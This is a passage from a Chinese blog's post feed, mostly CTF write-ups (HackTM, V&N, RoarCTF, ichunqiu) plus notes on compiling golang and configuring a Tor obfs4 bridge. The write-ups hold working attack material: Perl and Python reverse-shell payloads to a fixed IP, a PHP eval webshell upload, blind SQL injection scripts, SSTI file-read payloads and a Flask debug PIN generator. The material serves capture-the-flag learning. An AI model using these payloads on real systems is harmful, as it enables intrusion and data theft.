key[\"value\"])) 获取flag： import jwt # pip install pyjwtdata = { \"p\": \"54522055008424167489770171911371662849682639259766156337663049265694900400480408321973025639953930098928289957927653145186005490909474465708278368644555755759954980218598855330685396871675591372993059160202535839483866574203166175550802240701281743391938776325400114851893042788271007233783815911979\", \"q\": \"1\"}resp = requests.post(url+\"/init\", json=data)token = resp.json()['data']['token']jwt_claim = jwt.decode(token, verify=False, algorithms=['HS256'])assert jwt_claim['id'] == 0resp = requests.get(url+\"/flag\", headers={\"Authorization\": \"Bearer %s\" % token})print(resp.json()) 关于node.js的考核可以参考Pcat师傅分享的题解：https://xz.aliyun.com/t/7177Bonus！从大佬那拿到了一个画画机器人代码，简单实用！ import sysimport osimport structimport jsonimport requestsfrom PIL import Image # pip install pillow-simd requestsurl = \"http://167.172.165.153:60001\"def get_color_token(_hex): resp = requests.post(url+\"/login\", json={\"username\": \"hacKtm\"}) resp.raise_for_status() token = resp.json()['data']['token'] data = {\"color\": int(_hex, 16)} resp = requests.post(url+\"/updateUser\", json=data, headers={\"Authorization\": \"Bearer %s\" % token}) resp.raise_for_status() return tokenimg = Image.open(sys.argv[1])img = img.convert(\"RGBA\")pix = img.load()os.popen(\"rm output/*\").read()output = {}numcolors = []hexlookup = {}data = {}hexi = lambda k: struct.pack('B', k).hex()i = 0for x in range(0, img.width): for y in range(0, img.height): r, g, b, a = pix[x, y] if a == 0: continue cc = (r, g, b) if cc not in numcolors: numcolors.append(cc) i += 1 hexlookup.setdefault(cc, f\"{hexi(r)}{hexi(g)}{hexi(b)}\") data.setdefault(hexlookup[cc], []) data[hexlookup[cc]].append((x, y))for k, v in data.items(): f = open(\"output/%s.txt\" % k, \"a\") for coord in v: x, y = coord f.write(\"%s\\n\" % json.dumps({\"x\": x, \"y\": y})) f.close()for k, v in data.items(): f = open(\"output/%s.sh\" % k, \"a\") f.write(\"#!/bin/bash\\n\\n\") token = get_color_token(k) cmd = \"\"\"curl -vv -XPOST -m3 -s --data \"$1\" -H \"Content-Type: application/json\" -H \"Authorization: Bearer %s\" %s/paint\"\"\" % ( token, url ) f.write(cmd) f.write(\"\\n\") f.close() print(\"parallel -j +10 ./output/%s.sh &lt; output/%s.txt\" % (k, k))os.popen(\"chmod +x output/*.sh\").read() 用法 1、该脚本利用题目提供的JSON像素数据获取一个120*80的PNG图像(比如这个题目就给了包含像素数据的JSON) 2、生成像素数据：python main.py &quot;image.png&quot; 3、像素数据在output/中 4、该脚本将输出可以运行的GNU并行命令这个题目确实学到了很多。 总结简单的可以做，难的做不出，但是学到很多，继续努力！ヾ(◍°∇°◍)ﾉﾞ","link":"/2020/02/04/HackTM2020-WriteUp/"},{"title":"V&N公开赛","text":"隔离在家无事做，打打比赛乐趣寻~ 卧槽！毕设还没开始？！🤨 TimeTravel考察CVE-2016-5385：可以理解为伪造代理吧。 题目分析&lt;?phperror_reporting(0);require __DIR__ . '/vendor/autoload.php';use GuzzleHttp\\Client;highlight_file(__FILE__);if(isset($_GET['flag'])) { $client = new Client(); $response = $client-&gt;get('http://127.0.0.1:5000/api/eligible'); $content = $response-&gt;getBody(); $data = json_decode($content, TRUE); if($data['success'] === true) { echo system('/readflag'); }}if(isset($_GET['file'])) { highlight_file($_GET['file']);}if(isset($_GET['phpinfo'])) { phpinfo();} 审计代码，可以看到使用了Guzzle： Guzzle是一个使得利用PHP实现发送HTTP请求，方便和web service集成的PHP客户端模拟组件。一句话，它就像一个PHP写的浏览器。当你的服务端程序需要作为客户端来访问其他的service服务时，这就是你所需要的。简单的接口构建query string，POST requests,streaming large uploads/downloads,使用HTTP cookies,上传json data等。 根据代码逻辑，我们可以通过flag传参来拿到flag，但是是通过在服务器上创建一个client()，然后利用这个client去访问本地5000端口下的/api/eligible文件夹下的文件，将返回的json数据解码之后，如果字段里的success为true，即可拿到flag。 关键就在于$client-&gt;get('http://127.0.0.1:5000/api/eligible')，题目服务器上肯定是没有这个了，想要实现要么可以通过拿到shell写入，要么就是代理到VPS上。通过phpinfo可以看到，接口用的是fastCGI：找到的CVE-2016-5385就是通过CGI来伪造代理，大致原理： cgi(fastcgi)要将用户传入的所有HTTP头都加上HTTP_前缀放入环境变量中，而恰好大多数类库约定俗成会提取环境变量中的HTTP_PROXY值作为HTTP代理地址。于是，恶意用户通过提交Proxy: http://evil.com这样的HTTP头，将使用缺陷类库的网站的代理设置为http://evil.com，进而窃取数据包中可能存在的敏感信息。 于是，我们就可以理一下解题思路了： 1、在VPS上构造/api/eligible/index.php，并且读取到的结果要包含{“success”:true}，可以参考下面的index.php的代码 2、利用php -S localhost:5000在VPS上打开web服务的端口，注意：在包含/api/eligible/index.php的文件夹下开启web服务 3、通过flag传参，抓包，在请求头中加入：http://ip:port，此处的ip是VPS的ip(由于BUU要求内网环境，这里就填内网机器的ip)，port为VPS上一个开启的端口，可以利用php -S命令开启两个web服务端口来进行 //index.php&lt;?php$data = array();$data['success'] = true; $json_string = json_encode($data);echo $json_string; ?&gt; 由于BUU上需要用内网，就在BUU中开了一个内网环境作为VPS：如此以来，VPS就成为代理了，后面的$client-&gt;get('http://127.0.0.1:5000/api/eligible')也就在VPS上执行了，从而找到指定文件，返回{“success”:true}，进而通过后面的判断，拿到flag。 CHECKIN考察利用perl或python反弹shell，通过文件描述符读取被删除的文件内容。 题目分析题目源码如下： from flask import Flask, request import os app = Flask(__name__) flag_file = open(\"flag.txt\", \"r\") # flag = flag_file.read() # flag_file.close() # @app.route('/flag') # def flag():# return flag#want flag? naive! # You will never find the thing you want:) I think @app.route('/shell') def shell(): os.system(\"rm -f flag.txt\") exec_cmd = request.args.get('c') os.system(exec_cmd) return \"1\" @app.route('/') def source(): return open(\"app.py\",\"r\").read() if __name__ == \"__main__\": app.run(host='0.0.0.0') 可以看到，flag文件首先被读取了，读取文件的进程在内存中是存在的，因此当我们通过/shell?c=来传入命令的时候，虽然会先删掉flag文件，但是flag内容仍然在内存里，通过读取/proc/PID/fd/文件描述符来读取。解题的关键就是通过参数c利用system执行命令来反弹shell，然后去进程信息中找flag。 在这里curl不能用了，但是还可以利用perl、python、ruby等语言来反弹shell，pyload如下： /shell?c=perl%20-MIO%20-e%20%27$p=fork;exit,if($p);$c=new%20IO::Socket::INET(PeerAddr,%22174.0.216.133:2017%22);STDIN-%3Efdopen($c,r);$~-%3Efdopen($c,w);system$_%20while%3C%3E;%27 /shell?c=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22174.0.216.133%22,2017));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27 注意是反弹shell到VPS上，但是BUU需要用内网环境，和上题一样，开一个BUU的内网环境，通过nc -l -p 2017监听端口:然后利用上面的payload访问即可反弹shell利用perl反弹的shell如下：利用python反弹的shell：其实还是python反弹的好用些。 通过cat /proc/PID/fd/文件描述符一个个地找就能拿到flag了。 HappyCTFd考察刚爆出的CTFd存在的一个CVE，CVE-2020-7245 解题上面的CVE链接中讲的已经很清楚了，整体的解题思路就是： 1、注册一个admin用户，(注意前面的空格) 2、更改上面用户的密码，即利用注册的邮箱来更改密码 3、成功修改管理员的密码并登录 注意BUU的内网环境需要用内网里的邮箱，否则收不到邮件，巨坑… 登录之后，在管理通道发现flag在哪里一个题目，把它的隐藏属性改为可见的，再到challenge页面即可看到该题目，下载附件即可拿到flag。 拉胯的三条命令想到了热剧“亲爱的，热爱的”… 解题下载附件之后，将后缀改为.zip解压发现一个数据包和一个提示的txt文件，提示将数据包中的端口从小到大排列即为flag。利用tcpdump直接读数据包中的端口，然后就能拿到flag，命令如下： tcpdump -n -r nmapll.pcapng 'tcp[13]=18' | awk '{print $3}' | sort -u 效果如下：组合即为flag。","link":"/2020/02/29/V&N%E5%85%AC%E5%BC%80%E8%B5%9B/"},{"title":"RoarCTF-simple_upload-WriteUp","text":"话说…这个题从打比赛到后来的复现，一直想着是爆破文件名，但是也一直没跑出来，条件竞争又竞争不过…后来偶然才发现另一种思路，新大陆🧐 RoarCTF-simple_upload tip：该题目在BUUCTF的题库里有环境可复现：https://buuoj.cn 题目描述打开题目链接之后，看到如下代码 &lt;?phpnamespace Home\\Controller;use Think\\Controller;class IndexController extends Controller{ public function index() { show_source(__FILE__); } public function upload() { $uploadFile = $_FILES['file'] ; if (strstr(strtolower($uploadFile['name']), \".php\") ) { return false; } $upload = new \\Think\\Upload();// 实例化上传类 $upload-&gt;maxSize = 4096 ;// 设置附件上传大小 $upload-&gt;allowExts = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型 $upload-&gt;rootPath = './Public/Uploads/';// 设置附件上传目录 $upload-&gt;savePath = '';// 设置附件上传子目录 $info = $upload-&gt;upload() ; if(!$info) {// 上传错误提示错误信息 $this-&gt;error($upload-&gt;getError()); return; }else{// 上传成功 获取上传文件信息 $url = __ROOT__.substr($upload-&gt;rootPath,1).$info['file']['savepath'].$info['file']['savename'] ; echo json_encode(array(\"url\"=&gt;$url,\"success\"=&gt;1)); } }} 可以发现，该站是ThinkPHP写的一个文件上传网站。 题目分析 1、分析代码可知，该站可以通过POST方法实现上传文件功能，但是从第14行代码发现php后缀的文件被禁止上传，因此我们需要想办法绕过限制，上传php小马。 2、该脚本通过allowExts方法设置上传类型，但是查阅资料得知这种使用方法是不对的，并不能限制上传的文件类型。 3、upload()函数不传参时为多文件上传，整个$_FILES数组的文件都会上传保存，可以利用该属性通过一次访问上传多个文件。结合以上分析得知的内容可知，可以利用$_FILES数组上传多个文件来绕过对php的过滤。 解题过程1、测试上传功能首先编写python脚本向网站POST一个非php的文件，这里上传了一个txt文件，测试能否正常上传文件，下面是上传测试代码段： url = \"http://c85e5a48-c5f8-4a5b-9a30-6a81677fd75e.node3.buuoj.cn\"path = url + \"/index.php/home/index/upload\"files = {\"file\":(\"ma.txt\",'hello')}r = requests.post(path, files=files)print(r.text) 回显内容如下: {\"url\":\"\\/Public\\/Uploads\\/2019-10-24\\/5db1841fb439d.txt\",\"success\":1} 能够成功上传文件。 2、测试上传php文件：url = \"http://c85e5a48-c5f8-4a5b-9a30-6a81677fd75e.node3.buuoj.cn\"path = url + \"/index.php/home/index/upload\"files = {\"file\":(\"ma.txt\",'hello'), \"file1\":(\"ma.php\", '&lt;?php eval($_GET[\"cmd\"]);')}r = requests.post(path, files=files) 回显内容如下： {\"url\":\"\\/Public\\/Uploads\\/2019-10-24\\/5db18420027a3.txt\",\"success\":1}{\"url\":\"\\/Public\\/Uploads\\/\",\"success\":1} 由回显可知，我们成功上传了php文件,但是并没有回显php的文件名 其实在比赛做赛题的时候发现，直接上传php文件也是可以成功的，只不过也不会回显文件名。 通过多次上传发现规律：新文件名是以微秒为单位转十六进制的字符串（后来在WP中了解到ThinkPHP中，文件名是通过uniqid函数生成的，uniqid函数是基于以微秒计的当前时间计算的）因此找到php的文件名，理论上就可以成功连接到我们上传的小马，而方法只有一个，那就是爆破。 3、爆破php文件名爆破代码如下： import requestsurl = \"http://c85e5a48-c5f8-4a5b-9a30-6a81677fd75e.node3.buuoj.cn\"path = url + \"/index.php/home/index/upload\"files = {\"file\":(\"ma.txt\",'hello'), \"file1\":(\"ma.php\", '&lt;?php eval($_GET[\"cmd\"]);')}r = requests.post(path, files=files)t1 = r.text.split(\"/\")[-1].split(\".\")[0]print (t1)s = \"1234567890abcdef\"for i in s: for j in s: for k in s: path = url + \"/Public/Uploads/2019-10-24/\" + t1[:-3] + \"%s%s%s.php\" % (i, j, k) r = requests.get(path, timeout=1) print(path) if r.status_code != 404: print(path) # print(r.text) break 由于我们是利用$_FILES数组的属性实现一次访问，上传两个文件，因此中间相隔的时间较短，利用以上单线程的爆破即可拿到php的文件名，然后常规操作连接小马拿flag。这里还有另一种方法是利用BP进行爆破，只需爆破文件名的后三个字符即可，其实原理是一样的，只是工具不同而已。但是在BUUCTF的站上使用BP爆破时会回显429 Too Many Requests (太多请求),同样如果用自己的多线程代码去爆破也会遇到这个问题，是网站为了限制客户端的请求数量的配置，没办法，只能用单线程。 总结在比赛的时候，由于不了解代码中一次访问可以上传多个文件的漏洞，便采用了上传三次文件的方法（第一次上传txt，第二次传php小马，第三次再传txt，以此得到命名范围），这就导致第一次和第三次拿到的文件名范围比较广，爆破困难，当时自己写了个蹩脚的多线程，最终也没能成功爆破出文件名…赛后看了几个WP关键步骤还是在于爆破文件名，我采用的这种方法也有人成功拿到了flag…不过正解应该还是利用漏洞一次上传多个文件来爆破吧。","link":"/2020/02/02/RoarCTF-simple_upload-WriteUp/"},{"title":"golang编译项目的一个巨坑","text":"最近在学一些新东西，涉及到了搭obfs4网桥，由于官方提供的网桥项目是go语言编写的，之前又没学过、也没搭过相关环境，可以说基本是从零搞起，其中遇到的问题…算了，下面这个问题必须记录，网上都没找到解决方案，一定要记录一下。 最初的环境搭建由于golang编写的项目会利用git去寻找依赖库，因此首先就需要配置git环境，由于之前知道了旧版的git可能会导致一些问题，于是就手动安装了新版的git。 配置git环境机器上可能已经存在git，可以通过如下命令查看版本信息： git version 如果版本较低，最好就手动更新一下。 首先移除旧版本的git： yum remove git 然后安装最新版的git，当然最好先装一下依赖库： yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel asciidocyum install gcc perl-ExtUtils-MakeMaker 依赖库装好之后，就可以安装、编译最新版的git了： [root@guest ~]# cd /usr/local/src/[root@guest src]# wget https://www.kernel.org/pub/software/scm/git/git-2.26.0.tar.xz[root@guest src]# tar -vxf git-2.26.0.tar.xz[root@guest src]# cd git-2.26.0[root@guest git-2.26.0]# make prefix=/usr/local/git all[root@guest git-2.26.0]# make prefix=/usr/local/git install[root@guest git-2.26.0]# echo &quot;export PATH=$PATH:/usr/local/git/bin&quot; &gt;&gt; /etc/profile[root@guest git-2.26.0]# source /etc/profile 至此，最新版git配置完毕，可以查看其版本信息： [root@guest git-2.26.0]# git versiongit version 2.26.0 配置golang环境golang的环境是参考网上的博客装的，其实就是利用yum安装： [root@guest ~]# yum -y install golang 最初装完之后也就没有管git的版本了，直接把obfs4的项目放在了go/src下进行编译了。 报错信息利用上面的方法搭建的环境直接去编译项目，结果一直报错： 不管是改项目目录、换方式编译，一直都是找不到依赖库的错误，甚至想到了会不会是作者的项目有问题、还给作者发了封邮件…请项目作者不要打我啊… 结果两天都没搞定…都要心灰意冷了… 偶然之间，我发现卸载golang的时候提示会同时卸载git，嗯？？？！！！这个git还是1.8版本的，嗯？？？！！！ 于是就实验了一下，我重新用yum装golang结果确实提示会同时装git-1.8.1，装上之后又看了一下git版本，1.8.1，woc…问题不会在这吧…实践证实，问题就在这。 解决问题首先把当前的golang直接yum remove掉，最好清的干净一些： rm -rf /usr/local/go git最新版的配置就不说了，上面已经讲到了，说一下最新版golang的安装配置。 到官网下载最新版的压缩包，拖到vps里，当然也可以直接wget，之后进行解压： tar -zxf go1.x.x.linux-amd64.tar.gz -C /usr/local 然后配置环境变量： vi /etc/profile 在profile末尾添加如下内容： #golang env configexport GO111MODULE=onexport GOROOT=/usr/local/go export GOPATH=/home/gopathexport PATH=$PATH:$GOROOT/bin:$GOPATH/bin 这里的GO111MODULE配置是go1.11后出的一种新的包管理go modules方式代替vendor机制，可以不需要GOPATH，项目代码也不一定要放在GOPATH下面。 GO111MODULE=auto 自动 GO111MODULE=on 使用go modules，不会在vendor和gopath找依赖 GO111MODULE=off 使用vendor 或者gotpath 然后到/home下新建gopath文件夹，新建之后即可使配置生效： source /etc/profile 查看golang版本go version已经是最新版。 测试将obfs4的项目放到/home/gopath之下，再次进行编译： 可以看到，已经可以成功编译。 问题解决，散花，不知道这是不是全网第一个解决这个问题的文章，不过还是惬意一下。 参考：git最新版配置golang最新版配置obfs4网桥配置","link":"/2020/04/01/golang%E7%BC%96%E8%AF%91%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B7%A8%E5%9D%91/"},{"title":"obfs4网桥问题的处理","text":"昨天的问题上午刚解决，结果又有新问题… 不过这问题网上好像还有人问了，但是貌似没什么解决方案，还有人说是obfs4的一个bug，着实让我抓狂，感觉是全网第一个解决的人，起码应该是第一篇解决的文章。惬意~🤣 报错问题上午成功编译obfs4项目之后，随后就对/etc/tor/torrc文件做了如下的配置： Log notice file /var/log/tor/notices.logRunAsDaemon 1ORPort 44443 #注意这个端口官方提供配置是443，不过443可能被占用导致tor启动失败，改一下就行Exitpolicy reject *:*BridgeRelay 1ServerTransportPlugin obfs4 exec /usr/local/bin/obfs4proxyExtORPort autoPublishServerDescriptor 0 然后重启tor服务：service tor restart，查看一下tor的运行状态是没问题，嗯，放心了。 然后tail -F /var/log/tor/notices.log，原本以为没问题，但是回显结果如下： 没错，报了如下错误： [warn] Could not launch managed proxy executable at '/usr/local/bin/obfs4proxy' ('Permission denied'). 而成功的回显呢？ 没错，是上面这种情况 然后就疯狂科学上网找解决方式，说是什么要以托管的方式运行，但是就是一直解决不了… 发现猫腻是在多次尝试中，发现了疑似问题的多次restart服务，发现tor服务都正常，当时当终端直接键入tor去运行的时候，就会报错，嗯？？？ 不知道是端口占用还是进程没被杀死，但是这应该就是问题所在了，因为终端键入tor其实是执行tor这个程序，而restart是对tor服务的操作，服务成功运行不代表着tor启动了呀，tor不启动，那就不是以托管方式去运行obfs4proxy了呀，所有这就是问题！ 解决问题由于最初是yum安装的tor，尝试重装无果，便选择了自己下载源码编译。 编译、安装完成之后，对/usr/local/etc/tor下的torrc进行前面提到的配置，然后执行可执行程序，在/usr/local/bin中。 以命令./tor;tail -F /var/log/tor/notices.log同时启动tor和网桥，回显如下： good! 成功解决。","link":"/2020/04/16/obfs4%E7%BD%91%E6%A1%A5%E9%97%AE%E9%A2%98%E7%9A%84%E5%A4%84%E7%90%86/"},{"title":"ichunqiu新春战疫赛-WriteUp","text":"最近的几个公益赛确实办的不错，安全人员也都是很热爱祖国的♥，中国加油😠 武汉加油😠 大家加油😠 Web-简单的招聘系统考察SQL注入 解题测试发现登录的username处存在注入，万能密码就能登录这个地方存在注入点，可以利用盲注爆库，这里利用的思路就是通过判断用户名的条件为true登录进行注入，当然还需要一个现有的用户来登录，那么我们注册个用户就行了，参考如下的脚本： import requestsurl = 'http://4b5b40858ffa4258bd74ee72c106522abdc060eb08674169.changame.ichunqiu.com/index.php'# payload = \"2' and (select (mid((select database()),1,{0})))!='{1}\"# payload = \"2' and (select (mid((select table_name from information_schema.tables where table_schema='nzhaopin' limit 1 offset 3),1,{0})))!='{1}\"# payload = \"2' and (select (mid((select column_name from information_schema.columns where table_name='flag' limit 1 offset 1),1,{0})))!='{1}\"payload = \"2' and (select (mid((select flaaag from flag limit 1 offset 0),1,{0})))!='{1}\"# backup flag user flag: id flaaagdatabase = ''letter = 'abcdefghijklmnopqrstuvwxyz0123456789_-{}'for i in range(1, 80): for n in letter: data = { \"lname\": payload.format(i, database + n), \"lpass\": \"xxx\" } req = requests.post(url, data=data) req.encoding = 'gbk' # print(req.encoding) print(data[\"lname\"]) # print(req.text.encode('gbk').decode(req.apparent_encoding)) if \"成功\" not in req.text.encode('gbk').decode(req.apparent_encoding): print(\"* \" + n) database += n break Web-ezupload文件上传题 解题本以为是一道拐弯的上传题，结果直接传上马了…蚁剑连上，flag文件是空的，但是下面有个/readflag文件，开中断运行这个程序就能拿到flag。 Web-盲注利用正则进行时间盲注 解题题目已经说的很明显了，需要进行盲注，但是有waf，过滤了很多常用的注入语句，但是REGEXP并没有被ban，那么利用这个函数很简单地就能拿到flag。REGEXP：在列值内进行匹配，如果被匹配的文本在列值中出现，REGEXP将会找到它，相应的行将被返回，REGEXP能匹配整个列值。并且REGEXP检查总是返回0（没有匹配）或1（匹配）。 import requestsimport timeurl = 'http://49682a5d648a44fe94ba09271ec5fbe569c33f63b1c6435b.changame.ichunqiu.com/?id='flag = ''letter = 'abcdefghijklmnopqrstuvwxyz0123456789{}-'for i in range(99): for n in letter: payload = '1 and if((fl4g REGEXP \"^{0}\"),sleep(3),5);' payload = payload.format(flag+n) start_time = time.time() req = requests.get(url+payload) #print(req.text) if (time.time() - start_time)&gt;2: print(flag) flag += n break Web-blacklist本题是[强网杯]随便注的改版，考察堆叠注入，这题get到注入新姿势，利用mysql数据库中HANDLER绕过黑名单拿flag。 解题进入题目发现跟强网杯一样的输入框，首先就想到了堆叠注入，测试一下：可以看到，语法成功执行了。但是再去测试其他关键字的时候发现很多关键字被ban了：本想着利用强网杯的方法，通过改表名来拿flag的，但是rename也被ban了，结合select又被ban，常规的姿势怕是不行，后来借用handler才拿到flag，payload如下： 1';handler FlagHere open;handler FlagHere read first;# 关于handler可以参考这里。 Web-easysqli_copy还是考察PDO、check()函数的绕过、实际盲注，不过这题也get到了新姿势：利用预处理语句进行堆叠注入，这也是采用了PDO之后注入的新趋势了。扩展一下知识： 在php中，PDO有两种模式：模拟预编译与非模拟预编译。默认为模拟预编译模式，即不是真正的预编译，而是采用PDO::quote()函数，首先将用户输入转化为字符型，之后将引号等敏感字符转义。这样在gbk编码下，即可通过宽字节注入绕过防护。但是绕过PDO之后，依然很难绕过check()函数，于是此处利用到了PDO的第二个默认特性：支持多句执行，即可进行堆叠注入。 题目分析进入题目给出了源码： &lt;?php function check($str) { if(preg_match('/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\\^|&amp;|database/i',$str,$matches)) { print_r($matches); return 0; } else { return 1; } } try { $db = new PDO('mysql:host=localhost;dbname=pdotest','root','******'); } catch(Exception $e) { echo $e-&gt;getMessage(); } if(isset($_GET['id'])) { $id = $_GET['id']; } else { $test = $db-&gt;query(\"select balabala from table1\"); $res = $test-&gt;fetch(PDO::FETCH_ASSOC); $id = $res['balabala']; } if(check($id)) { $query = \"select balabala from table1 where 1=?\"; $db-&gt;query(\"set names gbk\"); $row = $db-&gt;prepare($query); $row-&gt;bindParam(1,$id); $row-&gt;execute(); } 通过源码发现，这里利用了PDO接口进行与数据库的链接，其中prepare就是准备了一个预处理语句，$row-&gt;bindParam(1,$id);中的binParam作用是绑定一个参数到指定的变量名。请教别的师傅了解到PDO中单引号可能是被自动过滤的，那就只好利用宽字节绕过：%df%27，源码里利用了预处理语句，注入的时候也就选择了利用预处理语句进行注入，同时结合16进制编码绕过对关键字的过滤。 解题脚本如下： import requestsimport timedef main(): url = 'http://96e2f11ccc1147559b9e8c7c9991e494c4dd1d4ca36f4428.changame.ichunqiu.com/?id=1%df%27;' payloads = \"set @a=0x{0};prepare ctftest from @a; execute ctftest;\" flag = '' letter = 'abcdefghijklmnopqrstuvwxyz0123456789{}-' for m in range(1, 80): print(\"前{0}位\".format(m)) payload = \"select if (ascii(mid((select fllllll4g from table1 ),{0},1))={1}, sleep(3), 1)\" # 由于我们会转换为十六进制，所以不存在任何过滤，关键词随便使用 for n in letter: # print(payload.format(m, n)) xxx = url + payloads.format(str_to_hex(payload.format(m, ord(n)))) # print(xxx) times = time.time() res = requests.post(xxx) if time.time() - times &gt;= 2: flag += n print(flag) breakdef str_to_hex(s): return ''.join([hex(ord(c)).replace('0x', '') for c in s]) # 字符串转换为16进制的函数if __name__ == '__main__': main() Web-Easqli考察盲注，这题也学到了新姿势：在union select被ban的情况下，进行多列数据的爆破。 题目分析进入题目是一个大大的输入框，多次尝试发现输入1的时候回显Hello Nu1L，输入0的时候回显hello，后来测试了多个关键字，发现union select单用的时候没问题，联合起来使用怎么都绕不过，or、and也被ban了，但是&amp;&amp;没被ban，这里有搞头，然后测了一下，语句为true回显也是hello Nu1L，就从这里下手了。后来又发现information_schema也被ban了，这时候想到了之前一个题里讲过的：利用mysql系统库sys.schema_table_statistics_with_buffer或者sys.schema_auto_increment_columns获取到了表名，但是因为union select被ban，无列名注入也没法进行，这时候就用到了前面说的学到的新姿势了：利用id=2-(select (select 1,{0})&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))&quot;这样的语句使进行两列的对比，从而爆破出第二列(flag列)的内容。脚本如下： 解题脚本import requestsurl = 'http://ab8f8551f4dc43a4bc43854950cb1088190a260570ee455c.changame.ichunqiu.com/index.php'headers = {\"Content-Type\": \"application/x-www-form-urlencoded\"}# payload = \"1 &amp;&amp; mid((select database()),1,{0})='{1}'\"# payload = \"1 &amp;&amp; mid((select table_name from sys.schema_table_statistics_with_buffer where table_schema='ctf' limit 1 offset 1),1,{0})='{1}'\"# payload = \"1 &amp;&amp; mid((select column_name from sys.schema_auto_increment_columns where table_name='f1ag_1s_h3r3_hhhhh' limit 1),1,{0})='{1}'\" #不可用，需要进行无列名查询# payload = \"1 &amp;&amp; mid((select * from f1ag_1s_h3r3_hhhhh limit 1),1,{0})='{1}'\" #不可用，因为有两列database = ''letter = '0123456789bcdehijkmnopqrstuvwxyz_-{}''''for i in range(1, 80): for n in letter: data = { \"id\": payload.format(i, database + n), } req = requests.post(url, data=data,headers=headers) # print(req.text.encode('gbk').decode(req.apparent_encoding)) if \"Hello Nu1L\" in req.text: print(n) flag += n print(database) break'''flag=''while 1: for i in range(32,126): a = chr(i).encode().hex() payload = \"id=2-(select (select 1,0x%s)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))\"%(flag.encode().hex()+a) #创建两列数据去比较 #print(\"Test:\"+chr(i)) html = requests.post(url=url,data=payload,headers=headers) if \"Hello Nu1L\" in html.text: flag += chr(i-1) print(\"Find:\"+flag) break if chr(i) == '}': flag +='}' breakprint(flag) Web-FlaskApp考察SSTI 题目分析进入题目发现是一个base64加密解密网站，直接考虑SSTI了。并且这个题跟另外一个利用Flask写的加密的题很像，便参考了那个题的解题思路：在开启DEBUG模式的情况下进行模板注入。首先测试一下SSTI是否能用：先在加密页面对加密一下，然后到解密页解密，页面回显如下：由此得知，确实是SSTI，同时还看到了开启了DEBUG模式。那就利用那道题的解题思路去做吧。 解题参考前面的链接我们知道，这道题可以通过计算出PIN来登录控制台，然后在控制台进行操作拿flag。但是生成PIN的脚本需要知道username(这个需要我们自己去找)、modname(一般是flask.app)、第三个值getattr(app, &quot;__name__&quot;, app.__class__.__name__)(一般是Flask)、第四个值getattr(mod, &quot;__file__&quot;, None)(在报错页面可以看到题目的环境)、第五个是str(uuid.getnode())的值，最后是机器码。报错页面回显如下： 获取username可以在/etc/passwd中读取到用户名，这里由于题目环境是Python3的，因此读文件需要用如下payload： {{ ''.__class__.__mro__[1].__subclasses__()[103].__init__.__globals__['open']('/etc/passwd').read() }} 如果环境是Python2，payload可以构造为： {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }} 跟前面的操作一样，先编码，再去解码引发SSTI，回显如下：我们看到可以用户名flaskweb，应该就是它了。 modename以及第三个、第四个已经知道了，直接去找str(uuid.getnode())的值。 获取str(uuid.getnode())构造payload： {{ ''.__class__.__mro__[1].__subclasses__()[103].__init__.__globals__['open']('/sys/class/net/eth0/address').read()}} 按照同样的方法进行注入，得到回显如下：然后到进制转换网站转换为十进制。 获取机器码构造payload： {{ ''.__class__.__mro__[1].__subclasses__()[103].__init__.__globals__['open']('/proc/self/cgroup').read()}} 回显如下：第一项/docker/后面的字符串即为我们要找的机器码。至此，拿到了生成PIN的所有的要素了，利用下面的脚本生成PIN： import hashlibfrom itertools import chainprobably_public_bits = [ 'flaskweb'# username 'flask.app',# modname 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),]private_bits = [ '2485377957890',# str(uuid.getnode()), /sys/class/net/ens33/address '3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320'# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 然后到题目的链接后面加上/console进入控制面板，输入PIN，获取权限：然后就可以随意输入读取文件拿flag了(注意列举文件的时候也可以直接列举根目录的ls /)： Web-easy_thinking考察ThinkPHP6.0存在的通过SESSION写文件的漏洞，同时也考察了对disable_functions的绕过。这一道题比赛的时候知道考察点是SESSION漏洞了，但是由于时间原因当时没有做出来，后来经smity师傅提示，结合getfly师傅的题解，对这道题加深了理解和学习。在BUU上复现了一下。 题目分析由于环境是ThinkPHP6.0，网上查了一下，找到了相关的漏洞文章：https://blog.csdn.net/god_zzZ/article/details/104275241https://paper.seebug.org/1114/#_1就是通过利用SESSION向服务器写入文件，从而拿到shell。 既然是通过SESSION写入文件，我们就需要找到存在SESSION写入的位置，在Member控制器中发现如下代码： if (!session('?UID')){ return redirect('/home/member/login'); }$data = input(\"post.\");$record = session(\"Record\");if (!session(\"Record\")){ session(\"Record\",$data[\"key\"]);} 可以看到，在search方法中可以进行任意SESSION写入，在这个地方我们就可以写入构造好的内容来生成shell，但是首先就需要满足第一个判断，即需要一个现有的SESSION文件并且包含UID字段，下面就需要找到将UID写入SESSION的地方。在Member控制器的login方法中找到如下代码： if ($userId){ session(\"UID\",$userId); return redirect(\"/home/member/index\");} 将UID写入SESSION的操作是在判断用户名和密码正确之后的，那么我们就需要先注册一个合法的用户进行登录。 捋一下整个的思路： 1、注册一个合法账户 2、利用注册的账户登录时更改SESSION字段的值为xxx.php，并且刚好是32个字符 3、利用相同的SESSION在搜索的时候写入一句话 4、在/runtime/session文件夹下测试一句话，注意是sess_开头的 参考getfly师傅的脚本： import requestsurl_reg = 